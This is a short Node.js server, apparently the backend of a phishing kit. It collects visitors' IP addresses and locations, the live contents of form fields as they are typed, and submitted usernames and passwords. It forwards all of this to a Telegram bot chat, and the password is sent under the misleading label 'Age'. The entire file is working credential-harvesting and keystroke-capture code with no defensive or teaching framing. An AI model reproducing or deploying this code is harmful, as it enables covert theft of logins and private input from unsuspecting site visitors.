const express = require("express");
const http = require("http");
const { Server } = require("socket.io");
const cors = require("cors");
const axios = require("axios");

const app = express();
const server = http.createServer(app);

const io = new Server(server,{
  cors:{origin:"*"}
});

app.use(cors());

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

function sendTelegram(message){
    axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
        chat_id: CHAT_ID,
        text: message
    }).catch(err => console.log("Telegram Error:", err.message));
}

io.on("connection",(socket)=>{

    console.log("User connected");

    // Receive visitor info from frontend
    socket.on("visitor-info",(data)=>{

        console.log("Visitor Data:", data);

        sendTelegram(`⚠️ New Visitor
IP: ${data.ip}
Location: ${data.city}, ${data.region}, ${data.country}`);
    });

    // typing tracking
    socket.on("typing",(data)=>{
        sendTelegram(`Typing
Field: ${data.field}
Value: ${data.value}`);
    });

    // final form submit
    socket.on("submit",(data)=>{
        sendTelegram(`✅ Final Submission
Username: ${data.username}
Age: ${data.password}`);
    });

});

server.listen(3000,()=>{
    console.log("Server running on port 3000");
});
